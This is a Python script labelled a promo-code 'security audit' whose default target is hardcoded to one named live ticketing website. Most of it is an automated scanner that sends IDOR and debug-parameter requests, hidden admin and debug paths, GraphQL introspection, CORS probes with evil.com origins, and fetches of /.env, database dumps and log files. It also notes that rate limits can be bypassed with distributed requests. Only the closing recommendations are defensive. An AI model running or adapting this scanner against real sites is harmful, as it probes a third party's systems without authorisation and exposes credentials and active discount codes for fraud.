#!/usr/bin/env python3
# Copyright (c) 2026 PenTestToolkit
# SPDX-License-Identifier: MIT
"""
SECURITY AUDIT TOOL - For System Owners Only

This tool helps identify ALL vulnerabilities that could expose
active promo codes WITHOUT brute-forcing (the critical issue).

USE THIS TO AUDIT YOUR OWN SYSTEM AND FIX VULNERABILITIES.
"""

import requests
import json
from colorama import Fore, init

init(autoreset=True)

class PromoCodeSecurityAudit:
    """
    Comprehensive security audit for promo code exposure vulnerabilities.
    Tests multiple attack vectors beyond brute-force enumeration.
    """
    
    def __init__(self, base_url="https://insomniagamingegypt.com"):
        self.base_url = base_url
        self.session = requests.Session()
        self.findings = []
        
        # Test for common Laravel patterns since X-Powered-By: PHP/8.3.2
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'application/json'
        })
    
    def check_idor_vulnerability(self, event_id=1):
        """
        VULNERABILITY 1: IDOR (Insecure Direct Object Reference)
        
        The API might return ALL promo codes when:
        - Accessing with admin=true parameter
        - Using a different HTTP method (POST, PUT)
        - Accessing a parent endpoint without specific code
        """
        print(f"\n{Fore.YELLOW}[AUDIT] Checking IDOR Vulnerabilities...")
        
        checks = [
            # Try to get all codes without specifying a code
            ('GET', f'/api/public/events/{event_id}/promo-codes'),
            ('GET', f'/api/public/events/{event_id}/promocodes'),
            ('GET', f'/api/public/events/{event_id}/discounts'),
            ('GET', f'/api/public/events/{event_id}/coupons'),
            
            # Try with admin/debug parameters
            ('GET', f'/api/public/events/{event_id}/promo-codes?admin=true'),
            ('GET', f'/api/public/events/{event_id}/promo-codes?debug=1'),
            ('GET', f'/api/public/events/{event_id}/promo-codes?all=true'),
            ('GET', f'/api/public/events/{event_id}/promo-codes?export=true'),
            
            # Try alternative methods that might list all
            ('POST', f'/api/public/events/{event_id}/promo-codes/list'),
            ('POST', f'/api/public/events/{event_id}/promo-codes/search'),
        ]
        
        for method, endpoint in checks:
            try:
                url = f"{self.base_url}{endpoint}"
                response = self.session.request(method, url, timeout=5)
                
                # If we get 200 with JSON array, this is CRITICAL
                if response.status_code == 200:
                    try:
                        data = response.json()
                        # Check if response is an array (list of codes)
                        if isinstance(data, list) and len(data) > 0:
                            print(f"{Fore.RED}[CRITICAL] IDOR VULNERABILITY FOUND!")
                            print(f"{Fore.RED}  Endpoint: {endpoint}")
                            print(f"{Fore.RED}  Returns: {len(data)} items")
                            self.findings.append({
                                "severity": "CRITICAL",
                                "type": "IDOR - Mass Data Exposure",
                                "endpoint": endpoint,
                                "method": method,
                                "evidence": f"Returns {len(data)} items without authentication"
                            })
                            return True
                    except:
                        pass
                        
            except Exception as e:
                pass
        
        print(f"{Fore.GREEN}[OK] No IDOR vulnerability detected in tested endpoints")
        return False
    
    def check_debug_endpoints(self, event_id=1):
        """
        VULNERABILITY 2: Debug/Development Endpoints Left Enabled
        
        Laravel apps often have debug endpoints that expose all data.
        Common patterns: /debug, /_debug, /api/debug, etc.
        """
        print(f"\n{Fore.YELLOW}[AUDIT] Checking for Debug Endpoints...")
        
        debug_patterns = [
            f'/api/debug/events/{event_id}/promo-codes',
            f'/api/dev/events/{event_id}/promo-codes',
            f'/api/test/events/{event_id}/promo-codes',
            f'/debug/events/{event_id}/promo-codes',
            f'/_debug/promo-codes',
            f'/admin/api/events/{event_id}/promo-codes',
            f'/api/admin/events/{event_id}/promo-codes',
            f'/api/internal/events/{event_id}/promo-codes',
            f'/api/v2/events/{event_id}/promo-codes',
            f'/api/beta/events/{event_id}/promo-codes',
            
            # GraphQL introspection (if GraphQL is used)
            '/graphql',
            '/api/graphql',
            '/graphql?query={promoCodes{code,discount}}',
        ]
        
        for endpoint in debug_patterns:
            try:
                url = f"{self.base_url}{endpoint}"
                response = self.session.get(url, timeout=5)
                
                if response.status_code == 200:
                    # Check if it returns promo codes
                    if 'promo' in response.text.lower() or 'code' in response.text.lower():
                        if len(response.text) > 200:  # Significant data returned
                            print(f"{Fore.RED}[CRITICAL] DEBUG ENDPOINT EXPOSED!")
                            print(f"{Fore.RED}  Endpoint: {endpoint}")
                            print(f"{Fore.RED}  Response: {response.text[:500]}...")
                            self.findings.append({
                                "severity": "CRITICAL",
                                "type": "Debug Endpoint Exposed",
                                "endpoint": endpoint,
                                "evidence": response.text[:200]
                            })
                            return True
                            
            except:
                pass
        
        print(f"{Fore.GREEN}[OK] No debug endpoints found")
        return False
    
    def check_graphql_introspection(self):
        """
        VULNERABILITY 3: GraphQL Introspection
        
        If the API uses GraphQL, introspection queries can expose
        the entire schema including promo code queries.
        """
        print(f"\n{Fore.YELLOW}[AUDIT] Checking for GraphQL Introspection...")
        
        introspection_query = """
        {
          __schema {
            types {
              name
              fields {
                name
                type {
                  name
                }
              }
            }
          }
        }
        """
        
        graphql_endpoints = [
            '/graphql',
            '/api/graphql',
            '/query',
            '/api/query'
        ]
        
        for endpoint in graphql_endpoints:
            try:
                url = f"{self.base_url}{endpoint}"
                response = self.session.post(
                    url, 
                    json={"query": introspection_query},
                    timeout=5
                )
                
                if response.status_code == 200:
                    data = response.json()
                    if '__schema' in str(data):
                        print(f"{Fore.RED}[CRITICAL] GRAPHQL INTROSPECTION ENABLED!")
                        print(f"{Fore.RED}  Endpoint: {endpoint}")
                        print(f"{Fore.RED}  Full schema is exposed!")
                        self.findings.append({
                            "severity": "CRITICAL",
                            "type": "GraphQL Introspection Enabled",
                            "endpoint": endpoint,
                            "evidence": "Schema introspection query succeeded"
                        })
                        return True
                        
            except:
                pass
        
        print(f"{Fore.GREEN}[OK] No GraphQL introspection detected")
        return False
    
    def check_information_disclosure(self, event_id=1):
        """
        VULNERABILITY 4: Information Disclosure
        
        API might leak codes through:
        - Verbose error messages
        - Stack traces with debug data
        - API documentation (Swagger/OpenAPI)
        - CORS misconfigurations
        """
        print(f"\n{Fore.YELLOW}[AUDIT] Checking for Information Disclosure...")
        
        # Check for API documentation
        doc_endpoints = [
            '/api/docs',
            '/api/documentation',
            '/swagger.json',
            '/openapi.json',
            '/api/swagger',
            '/api/openapi',
        ]
        
        for endpoint in doc_endpoints:
            try:
                url = f"{self.base_url}{endpoint}"
                response = self.session.get(url, timeout=5)
                
                if response.status_code == 200 and ('swagger' in response.text.lower() or 'openapi' in response.text.lower()):
                    print(f"{Fore.RED}[WARNING] API Documentation Exposed!")
                    print(f"{Fore.RED}  Endpoint: {endpoint}")
                    print(f"{Fore.RED}  This may expose all API endpoints including promo code endpoints")
                    self.findings.append({
                        "severity": "HIGH",
                        "type": "API Documentation Exposed",
                        "endpoint": endpoint
                    })
                    
            except:
                pass
        
        # Check for verbose errors
        print(f"{Fore.CYAN}[*] Testing for verbose error messages...")
        try:
            # Trigger an error with invalid input
            url = f"{self.base_url}/api/public/events/{event_id}/promo-codes/%00"
            response = self.session.get(url, timeout=5)
            
            if response.status_code >= 500:
                if 'stack trace' in response.text.lower() or 'line' in response.text.lower():
                    print(f"{Fore.RED}[WARNING] Verbose error messages leak information!")
                    self.findings.append({
                        "severity": "MEDIUM",
                        "type": "Verbose Error Messages",
                        "evidence": "Stack traces exposed in error responses"
                    })
                    
        except:
            pass
        
        print(f"{Fore.GREEN}[OK] Information disclosure checks complete")
    
    def check_cors_misconfiguration(self):
        """
        VULNERABILITY 5: CORS Misconfiguration
        
        Allows any website to make requests to your API.
        Combined with the promo code endpoint, any malicious site
        can enumerate codes from visitors' browsers.
        """
        print(f"\n{Fore.YELLOW}[AUDIT] Checking CORS Configuration...")
        
        test_origins = [
            'https://evil.com',
            'http://localhost:3000',
            'https://attacker.com',
            'null'
        ]
        
        for origin in test_origins:
            try:
                headers = {'Origin': origin}
                response = self.session.get(
                    f"{self.base_url}/api/public/events/1",
                    headers=headers,
                    timeout=5
                )
                
                cors_header = response.headers.get('Access-Control-Allow-Origin')
                
                if cors_header == '*' or cors_header == origin:
                    print(f"{Fore.RED}[CRITICAL] CORS MISCONFIGURATION!")
                    print(f"{Fore.RED}  Allows requests from: {origin}")
                    print(f"{Fore.RED}  Access-Control-Allow-Origin: {cors_header}")
                    print(f"{Fore.RED}  This enables browser-based attacks from any domain!")
                    self.findings.append({
                        "severity": "CRITICAL",
                        "type": "CORS Misconfiguration",
                        "issue": f"Allows origin: {cors_header}",
                        "impact": "Any website can enumerate promo codes via visitors' browsers"
                    })
                    return True
                    
            except:
                pass
        
        print(f"{Fore.GREEN}[OK] CORS properly configured")
        return False
    
    def check_backup_exposure(self):
        """
        VULNERABILITY 6: Backup/Log File Exposure
        
        Database backups or log files might contain active promo codes.
        """
        print(f"\n{Fore.YELLOW}[AUDIT] Checking for Backup/Log File Exposure...")
        
        backup_patterns = [
            '/backup.sql',
            '/backup.zip',
            '/database.sql',
            '/dump.sql',
            '/storage/logs/laravel.log',
            '/storage/logs/production.log',
            '/logs/app.log',
            '/.env',
            '/.env.backup',
            '/config.php',
            '/promo-codes.csv',
            '/promo-codes.xlsx',
            '/promo-codes.json',
            '/api/export/promo-codes',
        ]
        
        for pattern in backup_patterns:
            try:
                url = f"{self.base_url}{pattern}"
                response = self.session.get(url, timeout=5, allow_redirects=False)
                
                if response.status_code == 200:
                    content_type = response.headers.get('Content-Type', '')
                    if 'sql' in content_type or 'text' in content_type or 'json' in content_type:
                        print(f"{Fore.RED}[CRITICAL] POTENTIAL BACKUP/LOG FILE EXPOSED!")
                        print(f"{Fore.RED}  URL: {url}")
                        print(f"{Fore.RED}  Content-Type: {content_type}")
                        self.findings.append({
                            "severity": "CRITICAL",
                            "type": "Backup/Log File Exposed",
                            "url": url,
                            "content_type": content_type
                        })
                        return True
                        
            except:
                pass
        
        print(f"{Fore.GREEN}[OK] No backup files found exposed")
        return False
    
    def generate_security_report(self):
        """Generate comprehensive security audit report"""
        print(f"\n{Fore.MAGENTA}{'='*70}")
        print(f"{Fore.MAGENTA}SECURITY AUDIT REPORT")
        print(f"{Fore.MAGENTA}{'='*70}\n")
        
        if not self.findings:
            print(f"{Fore.GREEN}[EXCELLENT] No critical vulnerabilities found in automated scan!")
            print(f"{Fore.GREEN}However, the promo code endpoint still allows enumeration via:")
            print(f"{Fore.GREEN}  - Rate limiting (180/min) - can be bypassed with distributed requests")
            print(f"{Fore.GREEN}  - Response differentiation - valid vs invalid codes have different responses")
        else:
            print(f"{Fore.RED}[CRITICAL] {len(self.findings)} VULNERABILITIES FOUND!\n")
            
            for i, finding in enumerate(self.findings, 1):
                severity_color = Fore.RED if finding['severity'] == 'CRITICAL' else Fore.YELLOW
                print(f"{severity_color}[{i}] {finding['severity']}: {finding['type']}")
                if 'endpoint' in finding:
                    print(f"    Endpoint: {finding['endpoint']}")
                if 'evidence' in finding:
                    print(f"    Evidence: {finding['evidence'][:100]}...")
                print()
        
        # Save report
        report_file = 'SECURITY_AUDIT_REPORT.json'
        with open(report_file, 'w') as f:
            json.dump({
                "target": self.base_url,
                "findings": self.findings,
                "recommendations": self.get_recommendations()
            }, f, indent=2)
        
        print(f"{Fore.CYAN}Full report saved to: {report_file}")
        
        return self.findings
    
    def get_recommendations(self):
        """Get security recommendations"""
        return {
            "immediate_actions": [
                "REMOVE or AUTHENTICATE the GET /api/public/events/{id}/promo-codes/{code} endpoint",
                "Move promo code validation to the checkout flow (POST only, requires session)",
                "Return generic responses: same structure for valid/invalid codes",
                "Implement proper authentication and authorization",
                "Disable debug endpoints in production",
                "Fix CORS to only allow your domain"
            ],
            "enumeration_prevention": [
                "Use longer, random codes (16+ characters with high entropy)",
                "Implement account-level rate limiting (not just IP)",
                "Add CAPTCHA or proof-of-work for promo code validation",
                "Monitor for enumeration patterns and auto-block suspicious activity",
                "Implement exponential backoff for failed attempts"
            ],
            "data_exposure_prevention": [
                "Ensure no debug endpoints are exposed",
                "Disable GraphQL introspection in production",
                "Remove API documentation from public access",
                "Block access to .env, logs, and backup files",
                "Audit all endpoints that return promo code data"
            ]
        }

def main():
    print(f"""
{Fore.CYAN}
  ____            _       _             _     _              _   _
 / ___|  ___ __ _| |_ ___| |__   ___   | |   (_)_ __  _   _| |_| |__
 \___ \ / __/ _` | __/ __| '_ \ / _ \  | |   | | '_ \| | | | __| '_ \
  ___) | (_| (_| | || (__| | | | (_) | | |___| | | | | |_| | |_| | | |
 |____/ \___\__,_|\__\___|_| |_|\___/  |_____|_|_| |_|\__,_|\__|_| |_|

    PROMO CODE SECURITY AUDIT - FOR SYSTEM OWNERS
    This tool checks for ALL attack vectors that expose active codes
    WITHOUT requiring brute-force enumeration.
    """)
    
    print(f"{Fore.YELLOW}WARNING: Only run this against systems you own!")
    input(f"\n{Fore.CYAN}Press Enter to start security audit...")
    
    audit = PromoCodeSecurityAudit()
    
    # Run all checks
    audit.check_idor_vulnerability()
    audit.check_debug_endpoints()
    audit.check_graphql_introspection()
    audit.check_information_disclosure()
    audit.check_cors_misconfiguration()
    audit.check_backup_exposure()
    
    # Generate report
    findings = audit.generate_security_report()
    
    # Print recommendations
    print(f"\n{Fore.CYAN}{'='*70}")
    print(f"{Fore.CYAN}IMMEDIATE ACTIONS REQUIRED")
    print(f"{Fore.CYAN}{'='*70}\n")
    
    for rec in audit.get_recommendations()["immediate_actions"]:
        print(f"  {Fore.RED}• {rec}")
    
    print(f"\n{Fore.YELLOW}Even if no vulnerabilities were found above,")
    print(f"{Fore.YELLOW}the promo code endpoint itself is STILL VULNERABLE to enumeration!")

if __name__ == "__main__":
    main()
